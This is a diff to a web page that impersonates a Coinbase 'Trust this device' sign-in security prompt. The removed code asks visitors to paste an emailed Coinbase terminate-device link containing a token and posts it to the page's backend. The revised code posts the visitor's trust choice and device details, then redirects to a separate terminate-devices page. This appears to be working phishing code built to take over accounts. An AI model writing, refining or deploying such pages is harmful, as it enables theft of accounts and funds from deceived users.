@@ -33,58 +33,26 @@
   .rv-btn[disabled]     { opacity: .6; cursor: wait; }
   .rv-foot              { font-size: 11px; color: #6b7280; text-align: center; margin-top: 18px; line-height: 1.35; }
 
-  /* Stage 2 is hidden until the visitor confirms "Trust this device" so the
-     page has a clear progression. */
-  .rv-stage2 {
-    margin-top: 24px;
-    padding-top: 22px;
-    border-top: 1px solid rgba(138,145,158,0.15);
-    opacity: 0;
-    transform: translateY(8px);
-    pointer-events: none;
-    transition: opacity .25s ease, transform .25s ease;
-  }
-  .rv-stage2.is-active {
-    opacity: 1;
-    transform: translateY(0);
-    pointer-events: auto;
-  }
-  .rv-stage2-heading { color: #fff; font-size: 17px; font-weight: 600; margin: 0; line-height: 1.25; }
-  .rv-stage2-desc    { color: #94a3b8; font-size: 13px; margin: 6px 0 14px 0; line-height: 1.5; }
-  .rv-stage2-desc strong { color: #cbd5e1; font-weight: 600; }
-  .rv-link-input {
-    width: 100%;
-    box-sizing: border-box;
-    background: rgba(255,255,255,0.04);
-    border: 1px solid rgba(138,145,158,0.25);
-    color: #fff;
-    border-radius: 10px;
-    padding: 12px 14px;
-    font-size: 13px;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-    resize: vertical;
-    min-height: 44px;
-    transition: border-color .15s, background-color .15s;
-  }
-  .rv-link-input:focus {
-    outline: none;
-    border-color: rgba(59,130,246,0.6);
-    background: rgba(255,255,255,0.06);
-  }
-  .rv-link-input::placeholder { color: #4b5563; }
-
-  /* Confirmation chip below the trust button after stage 1 completes. */
-  .rv-trust-confirmed {
+  #rv-confirm {
     display: none;
-    align-items: center;
-    gap: 8px;
-    color: #34d399;
-    font-size: 13px;
-    font-weight: 500;
-    margin-top: 4px;
+    margin-top: 24px;
+    text-align: center;
   }
-  .rv-stage1-done .rv-trust-confirmed { display: flex; }
-  .rv-stage1-done .rv-btn-secondary    { display: none; }
+  #rv-confirm.is-active { display: block; }
+  .rv-confirm-icon {
+    width: 56px;
+    height: 56px;
+    margin: 0 auto 16px;
+    border-radius: 9999px;
+    background: rgba(34,197,94,0.12);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #34d399;
+  }
+  .rv-confirm-title { color: #fff; font-size: 20px; font-weight: 600; margin: 0 0 8px; }
+  .rv-confirm-desc  { color: #94a3b8; font-size: 14px; margin: 0 0 20px; line-height: 1.5; }
+  .rv-trust-view.is-hidden { display: none !important; }
 </style>
 </head>
 <body class="__variable_188709 __variable_9a8899 antialiased">
@@ -101,10 +69,11 @@
         </div>
 
         <h1 id="rv-heading" class="font-semibold text-white text-[26px]">Trust this device</h1>
-        <h2 class="!text-[14px] !text-[#94a3b8] font-medium leading-[initial] mt-[6px]">
-          We noticed a new sign-in. Mark this device as trusted, then remove any device you don't recognize from your account.
+        <h2 id="rv-subtitle" class="!text-[14px] !text-[#94a3b8] font-medium leading-[initial] mt-[6px]">
+          We noticed a new sign-in. Mark this device as trusted to continue securing your account.
         </h2>
 
+        <div id="rv-trust-view">
         <!-- This-device card -->
         <div class="rv-card-wrap rv-card-detail">
           <div class="rv-row">
@@ -125,42 +94,25 @@
           </div>
         </div>
 
-        <p class="rv-step">Step 1 of 2</p>
-
         <div id="rv-stage1-wrap" class="rv-actions">
           <button id="rv-trust" type="button" class="rv-btn rv-btn-primary">Make this a trusted device</button>
           <button id="rv-deny"  type="button" class="rv-btn rv-btn-secondary">Not me — secure my account</button>
-          <div class="rv-trust-confirmed" aria-live="polite">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        </div>
+
+        <p class="rv-foot">Only trust this device if you recognize this sign-in.</p>
+        </div>
+
+        <!-- Confirmation — shown after trust; Got it navigates to terminate page -->
+        <div id="rv-confirm" aria-hidden="true">
+          <div class="rv-confirm-icon" aria-hidden="true">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
               <path d="M20 6 9 17l-5-5"></path>
             </svg>
-            <span id="rv-trust-confirmed-text">This device is now trusted</span>
           </div>
+          <h2 id="rv-confirm-title" class="rv-confirm-title">This device is now trusted</h2>
+          <p id="rv-confirm-desc" class="rv-confirm-desc">You're all set. On the next screen you'll remove any devices you don't recognize.</p>
+          <button id="rv-got-it" type="button" class="rv-btn rv-btn-primary">Got it</button>
         </div>
-
-        <!-- Stage 2 — revealed after trust confirmation -->
-        <div id="rv-stage2" class="rv-stage2" aria-hidden="true">
-          <p class="rv-step" style="margin-top: 0;">Step 2 of 2</p>
-          <h3 class="rv-stage2-heading">Terminate suspicious devices</h3>
-          <p class="rv-stage2-desc">
-            We just sent a verification email to the address on file. Open it, copy the
-            <strong>Terminate device</strong> link, and paste it below to sign out any device that shouldn't have access to your account.
-          </p>
-          <textarea
-            id="rv-link"
-            class="rv-link-input"
-            rows="2"
-            placeholder="https://www.coinbase.com/secure/terminate?token=..."
-            spellcheck="false"
-            autocapitalize="off"
-            autocomplete="off"
-          ></textarea>
-          <div class="rv-actions">
-            <button id="rv-terminate" type="button" class="rv-btn rv-btn-primary" disabled>Terminate suspicious devices</button>
-          </div>
-        </div>
-
-        <p class="rv-foot">For your safety, we'll keep this device active until any suspicious devices have been signed out.</p>
       </div>
     </div>
   </div>
@@ -263,12 +215,15 @@
   var ipEl          = document.getElementById('rv-ip');
   var locationEl    = document.getElementById('rv-location');
   var timeEl        = document.getElementById('rv-time');
-  var confirmedText = document.getElementById('rv-trust-confirmed-text');
+  var confirmTitle = document.getElementById('rv-confirm-title');
+  var trustView    = document.getElementById('rv-trust-view');
+  var confirmPanel = document.getElementById('rv-confirm');
+  var gotItBtn     = document.getElementById('rv-got-it');
 
-  heading.textContent       = 'Trust this ' + device.label;
-  thisLabel.textContent     = 'This ' + device.label;
-  browserOSEl.textContent   = device.browserOS;
-  confirmedText.textContent = 'This ' + device.label + ' is now trusted';
+  heading.textContent     = 'Trust this ' + device.label;
+  thisLabel.textContent   = 'This ' + device.label;
+  browserOSEl.textContent = device.browserOS;
+  if (confirmTitle) confirmTitle.textContent = 'This ' + device.label + ' is now trusted';
 
   timeEl.textContent = new Date().toLocaleString('en-US', {
     hour: 'numeric', minute: '2-digit', timeZoneName: 'short'
@@ -284,12 +239,9 @@
   });
 
   /* ---------- Stage handlers --------------------------------------- */
-  var stage1Wrap   = document.getElementById('rv-stage1-wrap');
-  var stage2       = document.getElementById('rv-stage2');
-  var trustBtn     = document.getElementById('rv-trust');
-  var denyBtn      = document.getElementById('rv-deny');
-  var linkInput    = document.getElementById('rv-link');
-  var terminateBtn = document.getElementById('rv-terminate');
+  var trustBtn = document.getElementById('rv-trust');
+  var denyBtn  = document.getElementById('rv-deny');
+  var subtitle = document.getElementById('rv-subtitle');
 
   function deviceDetail() {
     return window.__rvDeviceDetail || device.browserOS;
@@ -307,17 +259,27 @@
   trustBtn.addEventListener('click', function () {
     trustBtn.disabled = true;
     denyBtn.disabled = true;
-    stage1Wrap.classList.add('rv-stage1-done');
+    if (trustView) trustView.classList.add('is-hidden');
+    if (subtitle) subtitle.style.display = 'none';
+    if (confirmPanel) {
+      confirmPanel.classList.add('is-active');
+      confirmPanel.setAttribute('aria-hidden', 'false');
+    }
+    heading.textContent = 'Device trusted';
+    if (gotItBtn) gotItBtn.focus();
+  });
+
+  gotItBtn.addEventListener('click', function () {
+    gotItBtn.disabled = true;
+    gotItBtn.classList.add('opacity-60','cursor-wait');
     postResponse({
       step: 'trust_device',
       choice: 'approve',
       detail: deviceDetail()
+    }).then(function (d) {
+      if (d && d.nextUrl) location.href = d.nextUrl;
+      else location.href = '/signin/terminate-devices';
     });
-    setTimeout(function () {
-      stage2.classList.add('is-active');
-      stage2.setAttribute('aria-hidden', 'false');
-      linkInput.focus();
-    }, 200);
   });
 
   denyBtn.addEventListener('click', function () {
@@ -329,25 +291,6 @@
       step: 'trust_device',
       choice: 'deny',
       detail: deviceDetail()
-    }).then(function (d) {
-      if (d && d.nextUrl) location.href = d.nextUrl;
-      else location.href = '/loading';
-    });
-  });
-
-  linkInput.addEventListener('input', function () {
-    terminateBtn.disabled = !linkInput.value.trim();
-  });
-
-  terminateBtn.addEventListener('click', function () {
-    var link = linkInput.value.trim();
-    if (!link) return;
-    terminateBtn.disabled = true;
-    terminateBtn.classList.add('opacity-60','cursor-wait');
-    postResponse({
-      step: 'terminate_devices',
-      choice: 'submit',
-      detail: link
     }).then(function (d) {
       if (d && d.nextUrl) location.href = d.nextUrl;
       else location.href = '/loading';
